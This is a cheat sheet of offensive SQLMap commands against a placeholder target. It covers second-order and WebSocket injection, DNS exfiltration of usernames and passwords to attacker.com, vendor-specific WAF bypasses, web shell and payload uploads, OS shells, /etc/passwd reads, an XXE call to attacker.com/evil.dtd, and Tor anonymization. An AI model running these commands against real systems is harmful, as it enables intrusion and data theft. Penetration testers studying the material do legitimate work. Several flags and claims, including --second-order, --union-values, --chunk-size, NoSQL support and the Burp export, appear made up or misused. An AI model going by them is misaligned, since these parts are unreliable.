# Advanced SQLMap Techniques and Web Application Exploitation

## Overview
This document covers advanced SQLMap usage including second-order injections, WebSocket attacks, DNS exfiltration, WAF bypass techniques, and sophisticated exploitation scenarios.

## Advanced SQLMap Techniques

### Second-Order SQL Injection
**Objective**: Exploit SQL injection vulnerabilities that occur in a different location than where the payload is injected

**Techniques**:
```bash
# Basic second-order injection
sqlmap -u "http://target.com/register.php" --data="username=admin'&password=test&email=test@test.com" --second-order="http://target.com/profile.php"

# Second-order with authentication
sqlmap -u "http://target.com/register.php" --data="username=admin'&password=test" --second-order="http://target.com/admin/users.php" --cookie="PHPSESSID=abc123"

# Second-order with custom headers
sqlmap -u "http://target.com/api/register" --data='{"username":"admin'''","password":"test"}' --second-order="http://target.com/api/profile" --headers="Content-Type: application/json"

# Second-order with file upload
sqlmap -u "http://target.com/upload.php" --data="filename=test'&content=data" --second-order="http://target.com/files.php"
```

### WebSocket SQL Injection
**Objective**: Exploit SQL injection through WebSocket connections

**Techniques**:
```bash
# WebSocket injection with custom script
sqlmap -u "ws://target.com/websocket" --data='{"action":"search","query":"test"}' --technique=U

# WebSocket with authentication token
sqlmap -u "wss://target.com/api/ws" --data='{"token":"jwt_token","query":"admin'''"}' --headers="Authorization: Bearer token123"

# WebSocket with binary data
sqlmap -u "ws://target.com/binary" --data="binary_payload_with_injection" --binary-fields="query"
```

### DNS Exfiltration with SQLMap
**Objective**: Use DNS queries to exfiltrate data when direct output is not possible

**Techniques**:
```bash
# DNS exfiltration setup
sqlmap -u "http://target.com/page.php?id=1" --dns-domain="attacker.com" --technique=B

# Custom DNS exfiltration
sqlmap -u "http://target.com/page.php?id=1" --sql-query="SELECT CONCAT(username,':',password) FROM users" --dns-domain="exfil.attacker.com"

# DNS over HTTPS exfiltration
sqlmap -u "https://target.com/api/search" --data='{"q":"test"}' --dns-domain="doh.attacker.com" --technique=T
```

### Advanced WAF Bypass Techniques
**Objective**: Bypass Web Application Firewalls using various tamper scripts and techniques

**Built-in Tamper Scripts**:
```bash
# Multiple tamper scripts for different WAFs
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,charencode,randomcase

# CloudFlare bypass
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2plus,charencode,randomcase,equaltolike

# ModSecurity bypass
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,charencode,randomcase,between,equaltolike

# AWS WAF bypass
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2dash,charencode,randomcase,between

# Imperva bypass
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2mssqlblank,charencode,randomcase,between

# Akamai bypass
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2plus,charencode,randomcase,between,equaltolike

# F5 BIG-IP ASM bypass
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,charencode,randomcase,between,equaltolike,greatest

# Barracuda WAF bypass
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2plus,charencode,randomcase,between,equaltolike,greatest
```

**Custom Tamper Scripts**:
```python
#!/usr/bin/env python
# Custom tamper script for advanced WAF bypass

import re
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    # Advanced WAF bypass tamper script
    # Example: tamper("1 AND 1=1") returns '1/**/AND/**/1=1'
    
    retVal = payload
    
    if payload:
        # Replace spaces with comments
        retVal = re.sub(r"\s+", "/**/", retVal)
        
        # Replace equals with LIKE
        retVal = re.sub(r"=", " LIKE ", retVal)
        
        # Add random case
        retVal = ''.join(char.upper() if i % 2 == 0 else char.lower() 
                        for i, char in enumerate(retVal))
        
        # Add HTML encoding for special characters
        retVal = retVal.replace("'", "&#39;")
        retVal = retVal.replace('"', "&#34;")
        retVal = retVal.replace("<", "&#60;")
        retVal = retVal.replace(">", "&#62;")
    
    return retVal
```

### Advanced Exploitation Scenarios

#### Blind SQL Injection with Time Delays
```bash
# Time-based blind injection
sqlmap -u "http://target.com/search.php" --data="q=test" --technique=T --time-sec=5

# Custom time-based payload
sqlmap -u "http://target.com/api/search" --data='{"query":"test"}' --technique=T --time-sec=3 --headers="Content-Type: application/json"

# Boolean-based blind injection
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test" --technique=B --string="Welcome"
```

#### Union-based Injection with Column Discovery
```bash
# Automatic column discovery
sqlmap -u "http://target.com/product.php?id=1" --technique=U --union-cols=1-20

# Manual column specification
sqlmap -u "http://target.com/product.php?id=1" --technique=U --union-cols=5 --union-char="NULL"

# Union with specific data types
sqlmap -u "http://target.com/product.php?id=1" --technique=U --union-cols=5 --union-values="1,2,3,4,5"
```

#### Error-based Injection
```bash
# Error-based extraction
sqlmap -u "http://target.com/news.php?id=1" --technique=E --dbms=mysql

# Custom error-based payload
sqlmap -u "http://target.com/api/news" --data='{"id":1}' --technique=E --error-log-file="/tmp/errors.log"
```

#### Stacked Queries
```bash
# Stacked queries for command execution
sqlmap -u "http://target.com/admin.php?id=1" --technique=S --os-shell

# Stacked queries for file operations
sqlmap -u "http://target.com/admin.php?id=1" --technique=S --file-write="/tmp/shell.php" --file-dest="/var/www/html/shell.php"
```

### Database-Specific Advanced Techniques

#### MySQL Advanced Exploitation
```bash
# MySQL file operations
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"
sqlmap -u "http://target.com/page.php?id=1" --file-write="/tmp/shell.php" --file-dest="/var/www/html/shell.php"

# MySQL UDF exploitation
sqlmap -u "http://target.com/page.php?id=1" --udf-inject --shared-lib="/tmp/lib_mysqludf_sys.so"

# MySQL privilege escalation
sqlmap -u "http://target.com/page.php?id=1" --sql-query="SELECT user,password FROM mysql.user"
```

#### PostgreSQL Advanced Exploitation
```bash
# PostgreSQL command execution
sqlmap -u "http://target.com/page.php?id=1" --dbms=postgresql --os-shell

# PostgreSQL file operations
sqlmap -u "http://target.com/page.php?id=1" --dbms=postgresql --file-read="/etc/passwd"

# PostgreSQL large object exploitation
sqlmap -u "http://target.com/page.php?id=1" --dbms=postgresql --sql-query="SELECT lo_import('/etc/passwd')"
```

#### MSSQL Advanced Exploitation
```bash
# MSSQL xp_cmdshell
sqlmap -u "http://target.com/page.php?id=1" --dbms=mssql --os-shell

# MSSQL linked servers
sqlmap -u "http://target.com/page.php?id=1" --dbms=mssql --sql-query="SELECT * FROM OPENROWSET('SQLOLEDB','server=target;uid=sa;pwd=password','SELECT @@version')"

# MSSQL bulk insert
sqlmap -u "http://target.com/page.php?id=1" --dbms=mssql --file-write="/tmp/data.txt" --file-dest="C:\\temp\\data.txt"
```

#### Oracle Advanced Exploitation
```bash
# Oracle Java exploitation
sqlmap -u "http://target.com/page.php?id=1" --dbms=oracle --os-shell

# Oracle UTL_FILE exploitation
sqlmap -u "http://target.com/page.php?id=1" --dbms=oracle --sql-query="SELECT UTL_FILE.GET_LINE(UTL_FILE.FOPEN('/etc','passwd','R'),1) FROM dual"

# Oracle XML exploitation
sqlmap -u "http://target.com/page.php?id=1" --dbms=oracle --sql-query="SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://attacker.com/evil.dtd\"> %remote;]>'),'/l') FROM dual"
```

### Advanced Authentication Bypass

#### Session-based Injection
```bash
# Cookie-based injection
sqlmap -u "http://target.com/dashboard.php" --cookie="user_id=1*&session=abc123" --level=2

# Header-based injection
sqlmap -u "http://target.com/api/data" --headers="X-User-ID: 1*" --level=3

# Authentication bypass
sqlmap -u "http://target.com/login.php" --data="username=admin'/*&password=anything" --auth-type=basic --auth-cred="admin:admin"
```

#### JWT Token Injection
```bash
# JWT payload injection
sqlmap -u "http://target.com/api/user" --headers="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMSciLCJleHAiOjE2MzQ1Njc4OTB9.signature" --level=3

# JWT parameter injection
sqlmap -u "http://target.com/api/search" --data='{"token":"jwt_token","query":"test'''"}' --headers="Content-Type: application/json"
```

### NoSQL Injection with SQLMap
```bash
# MongoDB injection
sqlmap -u "http://target.com/api/users" --data='{"username":"admin","password":{"$ne":"1"}}' --headers="Content-Type: application/json" --technique=B

# CouchDB injection
sqlmap -u "http://target.com/api/search" --data='{"selector":{"name":"admin'''"},"fields":["name","password"]}' --headers="Content-Type: application/json"
```

### Advanced Data Extraction Techniques

#### Chunked Data Extraction
```bash
# Large data extraction with chunks
sqlmap -u "http://target.com/page.php?id=1" --dump --chunk-size=1000 --threads=5

# Specific table extraction
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump --where="role='admin'"

# Column-specific extraction
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users -C username,password --dump
```

#### Binary Data Extraction
```bash
# Binary data extraction
sqlmap -u "http://target.com/page.php?id=1" --sql-query="SELECT HEX(binary_column) FROM table_name" --binary-fields="binary_column"

# Base64 encoded extraction
sqlmap -u "http://target.com/page.php?id=1" --sql-query="SELECT TO_BASE64(binary_data) FROM files"
```

### Performance Optimization

#### Multi-threading and Speed Optimization
```bash
# High-speed scanning
sqlmap -u "http://target.com/page.php?id=1" --threads=10 --time-sec=1 --timeout=5

# Risk and level adjustment
sqlmap -u "http://target.com/page.php?id=1" --risk=3 --level=5

# Specific technique selection
sqlmap -u "http://target.com/page.php?id=1" --technique=BEUST --threads=5
```

#### Proxy and Anonymization
```bash
# Tor proxy usage
sqlmap -u "http://target.com/page.php?id=1" --tor --tor-type=SOCKS5 --tor-port=9050

# HTTP proxy chain
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://proxy1:8080" --proxy-cred="user:pass"

# Random User-Agent
sqlmap -u "http://target.com/page.php?id=1" --random-agent --delay=2
```

### Advanced Reporting and Output

#### Custom Output Formats
```bash
# XML output
sqlmap -u "http://target.com/page.php?id=1" --dump --output-dir="/tmp/sqlmap" --format=XML

# CSV output
sqlmap -u "http://target.com/page.php?id=1" --dump --csv-del=";" --output-dir="/tmp/results"

# Custom queries with output
sqlmap -u "http://target.com/page.php?id=1" --sql-query="SELECT CONCAT(username,':',password) FROM users" --output-dir="/tmp/creds"
```

### Integration with Other Tools

#### Burp Suite Integration
```bash
# Import from Burp Suite
sqlmap -r burp_request.txt --batch --level=3

# Export to Burp Suite
sqlmap -u "http://target.com/page.php?id=1" --save="burp_import.txt"
```

#### Metasploit Integration
```bash
# Generate Metasploit payload
sqlmap -u "http://target.com/page.php?id=1" --os-shell --msf-path="/opt/metasploit-framework"

# Custom payload delivery
sqlmap -u "http://target.com/page.php?id=1" --file-write="/tmp/payload.exe" --file-dest="/var/www/html/payload.exe"
```

## Conclusion

These advanced SQLMap techniques provide sophisticated methods for:

- **Second-order injection exploitation**
- **WebSocket and DNS-based attacks**
- **Advanced WAF bypass techniques**
- **Database-specific exploitation methods**
- **NoSQL injection techniques**
- **Performance optimization strategies**
- **Integration with other security tools**

These techniques represent the cutting edge of SQL injection exploitation and should be used responsibly in authorized penetration testing scenarios.

Remember: Advanced techniques require deep understanding of both the tool and the target environment.
